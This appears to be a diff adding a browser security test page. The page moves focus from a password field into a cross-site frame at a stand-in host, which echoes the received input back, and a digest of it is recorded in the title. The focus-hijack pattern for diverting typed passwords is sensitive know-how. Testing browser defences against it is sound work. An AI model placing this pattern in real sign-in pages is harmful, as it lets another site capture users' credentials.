@@ -1,0 +1,24 @@
+<!doctype html>
+<!--
+  A sign-in page that moves the focus. When the password field takes
+  the focus, the page gives the focus to a frame of another site. The
+  frame sends back what it receives, and the page writes the SHA-256 of
+  it into the document title.
+-->
+<meta charset="utf-8">
+<title>steal</title>
+<form>
+  <input id="user" name="user" autocomplete="username" autofocus>
+  <input id="pass" name="pass" type="password" autocomplete="current-password">
+</form>
+<iframe id="frame" src="https://sso.example.org/catch.html"></iframe>
+<script>
+const digest = async (text) => {
+  const bytes = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
+  return Array.from(new Uint8Array(bytes), (byte) => byte.toString(16).padStart(2, "0")).join("");
+};
+pass.addEventListener("focus", () => frame.focus());
+addEventListener("message", async (event) => {
+  document.title = "caught|" + await digest(String(event.data));
+});
+</script>
